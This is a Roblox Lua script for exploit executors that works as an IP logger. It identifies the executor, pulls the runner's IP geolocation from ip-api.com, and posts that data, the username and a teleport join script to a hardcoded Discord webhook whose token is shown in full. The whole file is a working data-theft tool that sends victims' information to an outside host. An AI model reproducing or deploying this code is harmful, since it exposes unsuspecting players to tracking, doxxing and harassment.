local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

-- Checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url = "https://discord.com/api/webhooks/1289429348683616297/EPm5Z7UAwweLVfH9LJ1pNHk3leqEKkd3jSAtloG8aSntsqOw3RowdUl8AW33_ii3QrRO" -- Your webhook URL

-- Function to send a message to the webhook
local function sendToWebhook(content)
    local data = {
        ["username"] = "Salmon-L0G",  -- Webhook display name
        ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- Avatar image
        ["content"] = content,  -- The message content
    }

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request = http_request or request or HttpPost or syn.request
    request(abcdef)
end

-- First message: Logs the user's information
local ip_info = game:HttpGet("http://ip-api.com/line/?fields=61439") -- Gets IP information
local user_log = "@everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger\n" .. "**IP Info:** " .. ip_info .. "\n**Username:** " .. game.Players.LocalPlayer.Name .. "\n**Executor:** " .. webhookcheck
sendToWebhook(user_log) -- Sends the user's information to the webhook as a normal message

-- Second message: Sends the join script separately
local join_message = "Join Script: " .. join_script
sendToWebhook(join_message) -- Sends the join script to the webhook as a normal message